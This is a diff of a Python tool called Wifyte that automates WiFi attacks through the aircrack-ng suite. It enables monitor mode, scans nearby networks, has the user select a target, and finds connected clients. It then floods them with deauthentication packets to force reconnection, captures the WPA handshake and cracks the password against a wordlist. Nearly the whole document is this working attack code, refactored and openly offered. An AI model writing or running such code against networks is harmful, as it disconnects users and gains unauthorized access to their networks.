@@ -6,14 +6,19 @@ import signal
 import subprocess
 import sys
 from dataclasses import dataclass
-from typing import List, Optional, Tuple
+from typing import List, Optional
 import shutil
 from datetime import datetime
 import tempfile
 import threading
+import logging
+
+# Logging configuration
+logging.basicConfig(level=logging.INFO, format="%(message)s")
+logger = logging.getLogger("wifyte")
 
 
-# Color for output
+# ANSI Color codes
 class Colors:
     HEADER = "\033[95m"
     BLUE = "\033[94m"
@@ -22,7 +27,18 @@ class Colors:
     RED = "\033[91m"
     ENDC = "\033[0m"
     BOLD = "\033[1m"
-    UNDERLINE = "\033[4m"
+
+
+# Log with color
+def colored_log(level, msg):
+    color_map = {
+        "info": Colors.BLUE,
+        "success": Colors.GREEN,
+        "warning": Colors.YELLOW,
+        "error": Colors.RED,
+    }
+    prefix = {"info": "[*]", "success": "[+]", "warning": "[!]", "error": "[!]"}
+    logger.info(f"{color_map[level]}{prefix[level]} {msg}{Colors.ENDC}")
 
 
 @dataclass
@@ -48,172 +64,140 @@ class Wifyte:
         self.stop_capture = False
         self.handshake_found = False
 
-        # Create a handshakes directory if it does not already exist
-        if not os.path.exists(self.handshake_dir):
-            os.makedirs(self.handshake_dir)
+        # Create handshake directory if it doesn't exist
+        os.makedirs(self.handshake_dir, exist_ok=True)
 
+        # Setup default wordlist
         self.wordlist_path = os.path.join(os.getcwd(), "wifyte.txt")
-
-        # Check if the wordlist exists
         if not os.path.exists(self.wordlist_path):
-            print(
-                f"{Colors.YELLOW}[!] Wordlist not found in {self.wordlist_path}{Colors.ENDC}"
-            )
-            print(f"{Colors.YELLOW}[!] Create a default wordlist...{Colors.ENDC}")
+            colored_log("warning", f"Wordlist not found in {self.wordlist_path}")
+            colored_log("warning", "Creating default wordlist...")
             with open(self.wordlist_path, "w") as f:
                 f.write("password\n12345678\nqwerty123\nadmin123\nwifi12345\n")
-            print(f"{Colors.GREEN}[+] Default wordlist created.{Colors.ENDC}")
+            colored_log("success", "Default wordlist created.")
 
-    def cleanup(self):
-        """Clearing temporary files"""
+    def __del__(self):
         try:
             shutil.rmtree(self.temp_dir)
         except Exception as e:
-            print(f"{Colors.RED}[!] Error clearing temp directory: {e}{Colors.ENDC}")
-
-    def __del__(self):
-        self.cleanup()
+            colored_log("error", f"Error clearing temp directory: {e}")
 
     def execute_command(
-        self, command, shell=False, capture_output=True, text=True
-    ) -> subprocess.CompletedProcess:
-        """Running shell commands with error handling"""
+        self, command, shell=False, capture_output=True
+    ) -> Optional[subprocess.CompletedProcess]:
+        """Run shell command with error handling"""
         try:
-            result = subprocess.run(
-                command, shell=shell, capture_output=capture_output, text=text
+            return subprocess.run(
+                command, shell=shell, capture_output=capture_output, text=True
             )
-            return result
         except Exception as e:
-            print(f"{Colors.RED}[!] Error when executing command: {e}{Colors.ENDC}")
-            print(f"{Colors.RED}[!] Command: {command}{Colors.ENDC}")
+            colored_log("error", f"Error executing command: {e}")
             return None
 
     def find_wifi_interfaces(self) -> List[str]:
-        """Find all available wifi interfaces"""
+        """Find available wifi interfaces"""
         result = self.execute_command(["iwconfig"], shell=True)
         if not result or result.returncode != 0:
-            print(
-                f"{Colors.RED}[!] Error: Failed to get wifi interface list{Colors.ENDC}"
-            )
+            colored_log("error", "Failed to get wifi interface list")
             sys.exit(1)
 
-        interfaces = []
-        for line in result.stdout.split("\n"):
-            if "IEEE 802.11" in line:
-                interface = line.split()[0]
-                interfaces.append(interface)
+        return [
+            line.split()[0]
+            for line in result.stdout.split("\n")
+            if "IEEE 802.11" in line
+        ]
 
-        return interfaces
+    def toggle_monitor_mode(self, interface, enable=True) -> Optional[str]:
+        """Toggle monitor mode on/off"""
+        if enable:
+            # Kill interfering processes
+            self.execute_command(["airmon-ng", "check", "kill"])
 
-    def check_monitor_mode(self, interface) -> bool:
-        """Check if the interface is in monitor mode"""
-        result = self.execute_command(["iwconfig", interface])
-        if not result or result.returncode != 0:
-            return False
+            # Turn off interface and enable monitor mode
+            self.execute_command(["ifconfig", interface, "down"])
+            result = self.execute_command(["airmon-ng", "start", interface])
 
-        return "Mode:Monitor" in result.stdout
+            if not result or result.returncode != 0:
+                colored_log("error", f"Failed to enable monitor mode on {interface}")
+                return None
 
-    def enable_monitor_mode(self, interface) -> Optional[str]:
-        """Enable monitor mode on the interface"""
-        # Turn off processes that may be interfering
-        self.execute_command(["airmon-ng", "check", "kill"])
-
-        # Turn off the interface
-        self.execute_command(["ifconfig", interface, "down"])
-
-        # Change to mode monitor
-        result = self.execute_command(["airmon-ng", "start", interface])
-        if not result or result.returncode != 0:
-            print(
-                f"{Colors.RED}[!] Error: Failed to enable monitor mode on {interface}{Colors.ENDC}"
+            # Find monitor interface name
+            match = re.search(
+                r"(Created monitor mode interface|monitor mode enabled on) (\w+)",
+                result.stdout,
             )
-            return None
-
-        # Search for the name of the created monitor interface
-        match = re.search(
-            r"(Created monitor mode interface|monitor mode enabled on) (\w+)",
-            result.stdout,
-        )
-        if match:
-            monitor_interface = match.group(2)
-        else:
-            # Alternative way if the output format is different
-            interfaces_after = self.find_wifi_interfaces()
-            for iface in interfaces_after:
-                if self.check_monitor_mode(iface):
-                    monitor_interface = iface
-                    break
+            if match:
+                monitor_interface = match.group(2)
             else:
-                monitor_interface = f"{interface}mon"  # Default airmon-ng assumptions
+                # Backup method to find monitor interface
+                monitor_interface = next(
+                    (
+                        iface
+                        for iface in self.find_wifi_interfaces()
+                        if "Mode:Monitor"
+                        in self.execute_command(["iwconfig", iface]).stdout
+                    ),
+                    f"{interface}mon",
+                )
 
-        # Ensuring the interface is up
-        self.execute_command(["ifconfig", monitor_interface, "up"])
+            # Ensure interface is up
+            self.execute_command(["ifconfig", monitor_interface, "up"])
+            colored_log("success", f"Monitor mode active on {monitor_interface}")
+            return monitor_interface
+        else:
+            # Disable monitor mode
+            result = self.execute_command(["airmon-ng", "stop", interface])
+            if not result or result.returncode != 0:
+                colored_log("error", "Failed to disable monitor mode")
+                return False
 
-        print(
-            f"{Colors.GREEN}[+] Monitor mode is active on the interface {monitor_interface}{Colors.ENDC}"
-        )
-        return monitor_interface
-
-    def disable_monitor_mode(self, monitor_interface) -> bool:
-        """Disable monitor mode"""
-        result = self.execute_command(["airmon-ng", "stop", monitor_interface])
-        if not result or result.returncode != 0:
-            print(f"{Colors.RED}[!] Error: Failed to disable monitor mode{Colors.ENDC}")
-            return False
-
-        # Restart NetworkManager to restore normal connection
-        self.execute_command(
-            ["service", "NetworkManager", "restart"], capture_output=False
-        )
-
-        print(
-            f"{Colors.GREEN}[+] Monitor mode disabled and NetworkManager restarted{Colors.ENDC}"
-        )
-        return True
+            # Restart network services
+            self.execute_command(
+                ["service", "NetworkManager", "restart"], capture_output=False
+            )
+            colored_log(
+                "success", "Monitor mode disabled and NetworkManager restarted."
+            )
+            return True
 
     def setup_interface(self):
-        """Setting up a wifi interface for scanning"""
-        print(f"{Colors.BLUE}[*] Searching for wifi interfaces...{Colors.ENDC}")
+        """Setup wifi interface for scanning"""
+        colored_log("info", "Searching for wifi interfaces...")
         interfaces = self.find_wifi_interfaces()
 
         if not interfaces:
-            print(f"{Colors.RED}[!] Error: No wifi interface found{Colors.ENDC}")
+            colored_log("error", "No wifi interface found")
             sys.exit(1)
 
-        # Check if any interfaces are already in monitor mode
+        # Check if any interface already in monitor mode
         for interface in interfaces:
-            if self.check_monitor_mode(interface):
-                print(
-                    f"{Colors.GREEN}[+] Interface {interface} already in monitor mode{Colors.ENDC}"
-                )
+            if "Mode:Monitor" in self.execute_command(["iwconfig", interface]).stdout:
+                colored_log("success", f"Interface {interface} already in monitor mode")
                 self.monitor_interface = interface
                 return
 
-        # If none are in monitor mode, select the first interface
+        # Enable monitor mode on first interface
         self.interface = interfaces[0]
-        print(f"{Colors.GREEN}[+] Using interface {self.interface}{Colors.ENDC}")
+        colored_log("success", f"Using interface {self.interface}")
+        self.monitor_interface = self.toggle_monitor_mode(self.interface, enable=True)
 
-        # Enable monitor mode
-        self.monitor_interface = self.enable_monitor_mode(self.interface)
         if not self.monitor_interface:
-            print(f"{Colors.RED}[!] Error: Failed to enable monitor mode{Colors.ENDC}")
+            colored_log("error", "Failed to enable monitor mode")
             sys.exit(1)
 
     def scan_networks(self) -> List[WiFiNetwork]:
-        """Scanning available wifi networks"""
+        """Scan available wifi networks"""
         if not self.monitor_interface:
-            print(
-                f"{Colors.RED}[!] Error: No monitor mode interface found{Colors.ENDC}"
-            )
+            colored_log("error", "No monitor mode interface found")
             return []
 
-        print(f"{Colors.BLUE}[*] Starting WiFi network scan...{Colors.ENDC}")
-        print(f"{Colors.YELLOW}[!] Press Ctrl+C to stop scanning{Colors.ENDC}")
+        colored_log("info", "Starting WiFi network scan...")
+        colored_log("warning", "Press Ctrl+C to stop scanning")
 
-        # File to save scan results
+        # File for scan results
         output_file = os.path.join(self.temp_dir, "scan-01.csv")
 
-        # Run airodump-ng for scanning
+        # Start airodump-ng
         proc = subprocess.Popen(
             [
                 "airodump-ng",
@@ -228,135 +212,180 @@ class Wifyte:
         )
 
         try:
-            # Scan for 6 seconds (faster than before)
-            for i in range(6):
+            # Scan for 5 seconds
+            for i in range(5):
                 time.sleep(1)
-                print(f"{Colors.BLUE}[*] Scanning... {i+1}/6{Colors.ENDC}", end="\r")
+                print(f"{Colors.BLUE}[*] Scanning... {i+1}/5{Colors.ENDC}", end="\r")
             print("\n")
         except KeyboardInterrupt:
-            print(f"\n{Colors.YELLOW}[!] Scanning stopped by user{Colors.ENDC}")
+            colored_log("warning", "Scanning stopped by user")
         finally:
             proc.send_signal(signal.SIGTERM)
             proc.wait()
 
         networks = []
 
-        # Parse scan results from CSV file
-        try:
-            if os.path.exists(output_file):
+        # Parse CSV results
+        if os.path.exists(output_file):
+            try:
                 with open(output_file, "r", encoding="utf-8", errors="replace") as f:
                     lines = f.readlines()
 
-                # Skip header
                 data_section = False
                 network_id = 0
 
-                for line in lines:
-                    line = line.strip()
+                for line in [l.strip() for l in lines]:
                     if line.startswith("BSSID"):
                         data_section = True
                         continue
-
                     if line.startswith("Station MAC"):
                         break
-
                     if data_section and line:
-                        parts = [part.strip() for part in line.split(",")]
-                        if len(parts) >= 14:
+                        parts = [p.strip() for p in line.split(",")]
+                        if len(parts) >= 14 and parts[13].strip():
                             network_id += 1
-                            bssid = parts[0]
-                            power = (
-                                int(parts[8].strip())
-                                if parts[8].strip()
-                                and parts[8].strip().lstrip("-").isdigit()
-                                else 0
-                            )
-                            channel = (
-                                int(parts[3].strip())
-                                if parts[3].strip() and parts[3].strip().isdigit()
-                                else 0
-                            )
-                            encryption = parts[5].strip() + " " + parts[6].strip()
-                            essid = parts[13].strip().replace("\x00", "")
-
-                            if essid:  # Only add networks with ESSID
+                            try:
                                 networks.append(
                                     WiFiNetwork(
                                         id=network_id,
-                                        bssid=bssid,
-                                        channel=channel,
-                                        power=power,
-                                        essid=essid,
-                                        encryption=encryption,
+                                        bssid=parts[0],
+                                        channel=(
+                                            int(parts[3]) if parts[3].isdigit() else 0
+                                        ),
+                                        power=(
+                                            int(parts[8])
+                                            if parts[8].lstrip("-").isdigit()
+                                            else 0
+                                        ),
+                                        encryption=f"{parts[5]} {parts[6]}".strip(),
+                                        essid=parts[13].strip().replace("\x00", ""),
                                     )
                                 )
-            else:
-                print(
-                    f"{Colors.RED}[!] Error: Scan results file not found{Colors.ENDC}"
-                )
-        except Exception as e:
-            print(f"{Colors.RED}[!] Error reading scan results: {e}{Colors.ENDC}")
+                            except (ValueError, IndexError):
+                                continue
+            except Exception as e:
+                colored_log("error", f"Error reading scan results: {e}")
+        else:
+            colored_log("error", "Scan results file not found")
 
         return networks
 
-    def deauth_clients(self, network: WiFiNetwork) -> bool:
-        """Deauth all clients on the target network using a more effective method"""
-        if not self.monitor_interface:
-            print(
-                f"{Colors.RED}[!] Error: No monitor mode interface found{Colors.ENDC}"
-            )
-            return False
+    def detect_connected_clients(self, network: WiFiNetwork) -> List[str]:
+        """Detect connected clients to the target network"""
+        colored_log("info", f"Detecting connected clients for {network.essid}...")
+        output_file = os.path.join(self.temp_dir, "clients-01.csv")
 
-        print(
-            f"{Colors.BLUE}[*] Performing aggressive deauth on {network.essid} ({network.bssid})...{Colors.ENDC}"
+        # Start airodump-ng to detect clients
+        proc = subprocess.Popen(
+            [
+                "airodump-ng",
+                "--bssid",
+                network.bssid,
+                "--channel",
+                str(network.channel),
+                "--write",
+                os.path.join(self.temp_dir, "clients"),
+                self.monitor_interface,
+            ],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
         )
 
-        # Method 1: Deauth broadcast (all client)
-        deauth_cmd1 = [
-            "aireplay-ng",
-            "--deauth",
-            "25",  # more deauth packets
-            "-a",
-            network.bssid,
-            self.monitor_interface,
-        ]
+        try:
+            # Wait for 8 seconds to detect clients
+            time.sleep(8)
+        except KeyboardInterrupt:
+            colored_log("warning", "Client detection stopped by user")
+        finally:
+            proc.send_signal(signal.SIGTERM)
+            proc.wait()
 
-        # Run deauth in a separate thread to avoid blocking the program
-        def run_deauth():
-            self.execute_command(deauth_cmd1, capture_output=False)
+        clients = []
 
-        deauth_thread = threading.Thread(target=run_deauth)
-        deauth_thread.daemon = True
-        deauth_thread.start()
+        # Parse client results
+        if os.path.exists(output_file):
+            try:
+                with open(output_file, "r", encoding="utf-8", errors="replace") as f:
+                    lines = f.readlines()
 
-        # Give a short time to ensure deauth packets are sent
-        time.sleep(1)
+                client_section = False
+                for line in [l.strip() for l in lines]:
+                    if line.startswith("Station MAC"):
+                        client_section = True
+                        continue
+                    if client_section and line:
+                        parts = [p.strip() for p in line.split(",")]
+                        if len(parts) >= 6 and parts[0].strip():
+                            clients.append(parts[0])
+            except Exception as e:
+                colored_log("error", f"Error reading client detection results: {e}")
+        else:
+            colored_log("error", "Client detection results file not found")
 
-        print(f"{Colors.GREEN}[+] Deauth packets successfully sent{Colors.ENDC}")
-        return True
+        # Log detected clients
+        if clients:
+            colored_log("success", f"Detected {len(clients)} connected clients.")
+        else:
+            colored_log("warning", "No connected clients detected.")
+
+        return clients
+
+    def deauthenticate_clients(self, network: WiFiNetwork, clients: List[str]):
+        """Deauthenticate all connected clients"""
+        colored_log(
+            "info",
+            f"Found {len(clients)} connected clients for {network.essid}. Starting deauthentication...",
+        )
+
+        for client in clients:
+            colored_log("info", f"Deauthenticating client {client}...")
+            deauth_cmd = [
+                "aireplay-ng",
+                "--deauth",
+                "10",
+                "-a",
+                network.bssid,
+                "-c",
+                client,
+                self.monitor_interface,
+            ]
+            subprocess.Popen(
+                deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+            )
+            time.sleep(3)  # Wait between deauth attempts
+
+        colored_log("success", "Deauthentication completed for all connected clients.")
 
     def capture_handshake(self, network: WiFiNetwork) -> Optional[str]:
-        """Capture handshake from the target network using an enhanced method"""
+        """Capture handshake from target network"""
         if not self.monitor_interface:
-            print(
-                f"{Colors.RED}[!] Error: No interfaces with monitor mode{Colors.ENDC}"
+            colored_log("error", "No monitor mode interface found")
+            return None
+
+        # Detect connected clients
+        clients = self.detect_connected_clients(network)
+        if not clients:
+            colored_log(
+                "error",
+                f"No connected clients detected for {network.essid}. Stopping process.",
             )
             return None
 
-        # File name for handshake
+        # Deauthenticate clients
+        self.deauthenticate_clients(network, clients)
+
+        # Create capture filename
         timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
         capture_name = f"{network.essid.replace(' ', '_')}_{timestamp}"
         capture_path = os.path.join(self.temp_dir, capture_name)
 
-        print(
-            f"{Colors.BLUE}[*] Starting handshake capture for {network.essid}...{Colors.ENDC}"
-        )
+        colored_log("info", f"Starting handshake capture for {network.essid}...")
 
-        # Reset flag
+        # Reset flags
         self.stop_capture = False
         self.handshake_found = False
 
-        # Run airodump-ng for capture handshake
+        # Start capture process
         capture_cmd = [
             "airodump-ng",
             "--bssid",
@@ -372,232 +401,157 @@ class Wifyte:
             capture_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
         )
 
-        # Start thread watcher for checking handshake
+        # Start handshake watcher
+        cap_file = f"{capture_path}-01.cap"
         watcher_thread = threading.Thread(
-            target=self.handshake_watcher, args=(capture_path, network)
+            target=self._handshake_watcher, args=(cap_file,)
         )
         watcher_thread.daemon = True
         watcher_thread.start()
 
-        # More aggressive deauth strategy
-        max_attempts = 30  # More attempts
-        attempt = 0
-
+        # Limit capturing to 1 minute
+        timeout = 60  # 1 minute
+        start_time = time.time()
         try:
-            while attempt < max_attempts and not self.handshake_found:
-                attempt += 1
+            while not self.handshake_found:
+                elapsed_time = int(time.time() - start_time)
+                remaining_time = max(0, timeout - elapsed_time)
                 print(
-                    f"{Colors.BLUE}[*] Deauth attempt {attempt}/{max_attempts}...{Colors.ENDC}"
+                    f"{Colors.BLUE}[*] Capturing handshake... Time left: {remaining_time}s{Colors.ENDC}",
+                    end="\r",
                 )
-
-                # Send deauth packets with different approaches in each attempt
-                if attempt % 2 == 0:
-                    # Approach 1: Deauth broadcast
-                    subprocess.Popen(
-                        [
-                            "aireplay-ng",
-                            "--deauth",
-                            "25",
-                            "-a",
-                            network.bssid,
-                            self.monitor_interface,
-                        ],
-                        stdout=subprocess.DEVNULL,
-                        stderr=subprocess.DEVNULL,
+                if elapsed_time >= timeout:
+                    colored_log(
+                        "warning", "Handshake capture timed out after 1 minute."
                     )
-                else:
-                    # Approach 2: MDK3 deauth (if available)
-                    mdk3_path = shutil.which("mdk3")
-                    if mdk3_path:
-                        subprocess.Popen(
-                            ["mdk3", self.monitor_interface, "d", "-b", network.bssid],
-                            stdout=subprocess.DEVNULL,
-                            stderr=subprocess.DEVNULL,
-                        )
-                    else:
-                        # Fallback approach: aireplay with more packets
-                        subprocess.Popen(
-                            [
-                                "aireplay-ng",
-                                "--deauth",
-                                "25",
-                                "-a",
-                                network.bssid,
-                                self.monitor_interface,
-                            ],
-                            stdout=subprocess.DEVNULL,
-                            stderr=subprocess.DEVNULL,
-                        )
-
-                # Wait a moment between deauth attempts (shorter than before)
-                for i in range(5):
-                    if self.handshake_found:
-                        break
-                    time.sleep(1)
-
-            # Final check if not detected by the watcher
-            cap_file = f"{capture_path}-01.cap"
-            if not self.handshake_found and os.path.exists(cap_file):
-                self.handshake_found = self.check_for_handshake(cap_file)
-
-            if not self.handshake_found:
-                print(
-                    f"{Colors.RED}[!] Failed to capture handshake after {max_attempts} attempts{Colors.ENDC}"
-                )
-                return None
-
-            # Copy handshake to handshakes directory
-            final_path = os.path.join(
-                self.handshake_dir, f"{network.essid.replace(' ', '_')}.cap"
-            )
-            shutil.copy(cap_file, final_path)
-            print(f"{Colors.GREEN}[+] Handshake saved to {final_path}{Colors.ENDC}")
-
-            return final_path
-
+                    break
+                time.sleep(1)
         except KeyboardInterrupt:
-            print(f"\n{Colors.YELLOW}[!] Capture cancelled by user{Colors.ENDC}")
-            return None
+            colored_log("warning", "Capture cancelled by user")
         finally:
             self.stop_capture = True
             capture_proc.send_signal(signal.SIGTERM)
             capture_proc.wait()
 
-    def handshake_watcher(self, capture_path: str, network: WiFiNetwork):
-        """Thread to monitor the capture file and check for handshake"""
-        cap_file = f"{capture_path}-01.cap"
-        check_interval = 1  # Check every 1 second
+        print("\n")  # Move to next line after countdown
 
+        if not self.handshake_found:
+            colored_log("error", "Failed to capture handshake after deauthentication.")
+            return None
+
+        # Save handshake file
+        final_path = os.path.join(
+            self.handshake_dir, f"{network.essid.replace(' ', '_')}.cap"
+        )
+        shutil.copy(cap_file, final_path)
+        colored_log("success", f"Handshake saved to {final_path}")
+        return final_path
+
+    def _handshake_watcher(self, cap_file: str):
+        """Watch for handshake in capture file"""
         while not self.stop_capture:
-            if os.path.exists(cap_file) and self.check_for_handshake(cap_file):
-                print(f"{Colors.GREEN}[+] Handshake detected!{Colors.ENDC}")
+            if os.path.exists(cap_file) and self._check_handshake(cap_file):
+                colored_log("success", "Handshake detected!")
                 self.handshake_found = True
                 self.stop_capture = True
                 break
-            time.sleep(check_interval)
+            time.sleep(1)
 
-    def check_for_handshake(self, cap_file: str) -> bool:
-        """Check the capture file for handshake"""
+    def _check_handshake(self, cap_file: str) -> bool:
+        """Check if capture file contains handshake"""
         if not os.path.exists(cap_file):
             return False
 
-        # Method 1: Using aircrack-ng
-        aircrack_result = self.execute_command(["aircrack-ng", cap_file])
-        if aircrack_result and "1 handshake" in aircrack_result.stdout:
-            return True
-
-        # Method 2: Using cowpatty (if available) - more accurate verification
-        cowpatty_path = shutil.which("cowpatty")
-        if cowpatty_path:
-            cowpatty_result = self.execute_command(["cowpatty", "-c", "-r", cap_file])
-            if (
-                cowpatty_result
-                and "Collected all necessary data to mount crack against WPA"
-                in cowpatty_result.stdout
-            ):
-                return True
-
-        # Method 3: Using pyrit (if available) - more accurate verification
-        pyrit_path = shutil.which("pyrit")
-        if pyrit_path:
-            pyrit_result = self.execute_command(["pyrit", "-r", cap_file, "analyze"])
-            if (
-                pyrit_result
-                and "handshake(s)" in pyrit_result.stdout
-                and not "0 handshake(s)" in pyrit_result.stdout
-            ):
-                return True
-
-        return False
-
-    def verify_handshake(self, handshake_path: str) -> bool:
-        """Verify if the handshake is valid using multiple methods"""
-        if not os.path.exists(handshake_path):
-            print(f"{Colors.RED}[!] Error: Handshake file not found{Colors.ENDC}")
-            return False
-
-        print(
-            f"{Colors.BLUE}[*] Verifying handshake with multiple tools...{Colors.ENDC}"
-        )
-
-        # Method 1: Aircrack-ng
-        aircrack_valid = False
-        result = self.execute_command(["aircrack-ng", handshake_path])
-        if result and "1 handshake" in result.stdout:
-            aircrack_valid = True
-            print(f"{Colors.GREEN}[+] Aircrack-ng: Handshake valid{Colors.ENDC}")
-
-        # Method 2: Cowpatty (if available)
-        cowpatty_valid = False
-        cowpatty_path = shutil.which("cowpatty")
-        if cowpatty_path:
-            result = self.execute_command(["cowpatty", "-c", "-r", handshake_path])
-            if (
-                result
-                and "Collected all necessary data to mount crack against WPA"
-                in result.stdout
-            ):
-                cowpatty_valid = True
-                print(f"{Colors.GREEN}[+] Cowpatty: Handshake valid{Colors.ENDC}")
-
-        # Final validation
-        is_valid = aircrack_valid or cowpatty_valid
-
-        if is_valid:
-            print(f"{Colors.GREEN}[+] Handshake verified and valid!{Colors.ENDC}")
-        else:
-            print(f"{Colors.RED}[!] Handshake is not valid or incomplete{Colors.ENDC}")
-
-        return is_valid
+        # Check with aircrack-ng
+        result = self.execute_command(["aircrack-ng", cap_file])
+        return result and "1 handshake" in result.stdout
 
     def crack_password(self, handshake_path: str) -> Optional[str]:
-        """Perform password cracking with wordlist using optimal method"""
-        if not os.path.exists(handshake_path):
-            print(f"{Colors.RED}[!] Error: Handshake file not found{Colors.ENDC}")
+        """Crack password from handshake"""
+        if not os.path.exists(handshake_path) or not os.path.exists(self.wordlist_path):
+            colored_log("error", "Handshake file or wordlist not found")
             return None
 
-        if not os.path.exists(self.wordlist_path):
-            print(f"{Colors.RED}[!] Error: Wordlist not found{Colors.ENDC}")
-            return None
+        colored_log("info", "Starting password cracking...")
+        colored_log("info", f"Using wordlist: {self.wordlist_path}")
 
-        print(f"{Colors.BLUE}[*] Starting password cracking...{Colors.ENDC}")
-        print(f"{Colors.BLUE}[*] Using wordlist: {self.wordlist_path}{Colors.ENDC}")
-
-        # Extract ESSID from the file name
-        essid = os.path.basename(handshake_path).split(".")[0].replace("_", " ")
-
-        # Metode 1: Hashcat (jika tersedia - lebih cepat)
-        hashcat_path = shutil.which("hashcat")
-        if hashcat_path:
-            # Konversi cap ke hccapx format (untuk hashcat)
-            hccapx_file = os.path.join(self.temp_dir, "handshake.hccapx")
-            self.execute_command(["cap2hccapx", handshake_path, hccapx_file])
-
-            if os.path.exists(hccapx_file):
-                print(
-                    f"{Colors.BLUE}[*] Using aircrack-ng for cracking...{Colors.ENDC}"
-                )
+        # Use aircrack-ng for cracking
         result = self.execute_command(
             ["aircrack-ng", "-w", self.wordlist_path, handshake_path]
         )
         if not result:
-            print(f"{Colors.RED}[!] Error saat cracking password{Colors.ENDC}")
+            colored_log("error", "Error cracking password")
             return None
 
-        # Cek hasil cracking
+        # Check results
         if "KEY FOUND!" in result.stdout:
             match = re.search(r"KEY FOUND!\s*\[\s*(.*?)\s*\]", result.stdout)
             if match:
                 password = match.group(1)
-                print(
-                    f"{Colors.GREEN}[+] Password ditemukan: {Colors.BOLD}{password}{Colors.ENDC}"
+                colored_log(
+                    "success", f"Password found: {Colors.BOLD}{password}{Colors.ENDC}"
                 )
                 return password
 
-        print(f"{Colors.RED}[!] Password tidak ditemukan dalam wordlist{Colors.ENDC}")
+        colored_log("error", "Password not found in wordlist")
         return None
 
-    def display_banner(self):
+    def run(self):
+        """Main program flow"""
+        self._display_banner()
+
+        try:
+            # Setup and scan
+            self.setup_interface()
+            self.networks = self.scan_networks()
+
+            if not self.networks:
+                colored_log("error", "No networks found.")
+                return self._exit_program()
+
+            # Display networks
+            print(
+                f"\n{Colors.BLUE}===== {len(self.networks)} Networks found ====={Colors.ENDC}"
+            )
+            for network in self.networks:
+                print(network)
+
+            # Select target
+            target = self.select_target()
+            if not target:
+                return self._exit_program()
+
+            colored_log("success", f"Selected target: {target.essid} ({target.bssid})")
+
+            # Capture and crack
+            handshake_path = self.capture_handshake(target)
+            if handshake_path:
+                self.crack_password(handshake_path)
+
+        except KeyboardInterrupt:
+            colored_log("warning", "Program cancelled by user")
+        finally:
+            self._exit_program()
+
+    def select_target(self):
+        """Select target network with input validation"""
+        while True:
+            try:
+                choice = int(
+                    input(
+                        f"\n{Colors.YELLOW}[?] Select Target [1-{len(self.networks)}]: {Colors.ENDC}"
+                    )
+                )
+                if 1 <= choice <= len(self.networks):
+                    return self.networks[choice - 1]
+                else:
+                    colored_log("error", "Invalid choice. Please try again.")
+            except (ValueError, KeyboardInterrupt):
+                colored_log("warning", "Invalid input or cancelled.")
+                return None
+
+    def _display_banner(self):
+        """Display program banner"""
         banner = f"""
 {Colors.BOLD}{Colors.BLUE}
 ██╗    ██╗██╗███████╗██╗   ██╗████████╗███████╗
@@ -612,73 +566,8 @@ class Wifyte:
 """
         print(banner)
 
-    def run(self):
-        """Run Main Program"""
-        self.display_banner()
-
-        # Setup interface
-        self.setup_interface()
-
-        # Scan jaringan
-        self.networks = self.scan_networks()
-
-        if not self.networks:
-            print(f"{Colors.RED}[!] No networks found.{Colors.ENDC}")
-            self.exit_program()
-            return
-
-        # Tampilkan hasil scan
-        print(
-            f"\n{Colors.BLUE}===== {len(self.networks)} Networks found ====={Colors.ENDC}"
-        )
-        for network in self.networks:
-            print(network)
-
-        # Pilih target
-        try:
-            network_choice = int(
-                input(
-                    f"\n{Colors.YELLOW}[?] Select Target [1-{len(self.networks)}]: {Colors.ENDC}"
-                )
-            )
-            if network_choice < 1 or network_choice > len(self.networks):
-                print(f"{Colors.RED}[!] Invalid choice{Colors.ENDC}")
-                self.exit_program()
-                return
-        except ValueError:
-            print(f"{Colors.RED}[!] Invalid input{Colors.ENDC}")
-            self.exit_program()
-            return
-        except KeyboardInterrupt:
-            print(f"\n{Colors.YELLOW}[!] Program cancelled by user{Colors.ENDC}")
-            self.exit_program()
-            return
-
-        target_network = self.networks[network_choice - 1]
-        print(
-            f"\n{Colors.GREEN}[+] Selected target: {target_network.essid} ({target_network.bssid}){Colors.ENDC}"
-        )
-
-        # Capture handshake
-        handshake_path = self.capture_handshake(target_network)
-        if not handshake_path:
-            print(f"{Colors.RED}[!] Failed capturing handshake!{Colors.ENDC}")
-            self.exit_program()
-            return
-
-        # Verifikasi handshake
-        if not self.verify_handshake(handshake_path):
-            self.exit_program()
-            return
-
-        # Crack password
-        self.crack_password(handshake_path)
-
-        # Keluar program
-        self.exit_program()
-
-    def exit_program(self):
-        """Exit program dengan pilihan untuk mematikan monitor mode"""
+    def _exit_program(self):
+        """Clean exit"""
         try:
             disable_monitor = (
                 input(
@@ -688,51 +577,45 @@ class Wifyte:
             )
 
             if disable_monitor and self.monitor_interface:
-                self.disable_monitor_mode(self.monitor_interface)
-            else:
-                print(
-                    f"{Colors.GREEN}[+] Monitor mode remains active on {self.monitor_interface}{Colors.ENDC}"
+                self.toggle_monitor_mode(self.monitor_interface, enable=False)
+            elif self.monitor_interface:
+                colored_log(
+                    "success",
+                    f"Monitor mode remains active on {self.monitor_interface}",
                 )
 
-            print(f"{Colors.BLUE}[*] Program closed, thank you!{Colors.ENDC}")
+            colored_log("info", "Program closed, thank you!")
         except KeyboardInterrupt:
-            print(f"\n{Colors.YELLOW}[!] Program cancelled by user{Colors.ENDC}")
+            colored_log("warning", "Program cancelled by user")
             if self.monitor_interface:
-                print(
-                    f"{Colors.GREEN}[+] Monitor mode remains active on {self.monitor_interface}{Colors.ENDC}"
+                colored_log(
+                    "success",
+                    f"Monitor mode remains active on {self.monitor_interface}",
                 )
 
 
 if __name__ == "__main__":
+    # Check root access
+    if os.geteuid() != 0:
+        colored_log(
+            "error", "This program requires root access. Please run with 'sudo'"
+        )
+        sys.exit(1)
+
+    # Check dependencies
+    dependencies = ["airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng"]
+    missing = [dep for dep in dependencies if shutil.which(dep) is None]
+
+    if missing:
+        colored_log("error", f"Missing dependencies: {', '.join(missing)}")
+        colored_log(
+            "warning",
+            "Please install aircrack-ng suite: sudo apt-get install aircrack-ng",
+        )
+        sys.exit(1)
+
     try:
-        # Cek apakah dijalankan sebagai root
-        if os.geteuid() != 0:
-            print(
-                f"{Colors.RED}[!] Error: This program requires root access. Please run with 'sudo'{Colors.ENDC}"
-            )
-            sys.exit(1)
-
-        # Cek dependensi
-        dependencies = ["airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng"]
-        missing_deps = []
-
-        for dep in dependencies:
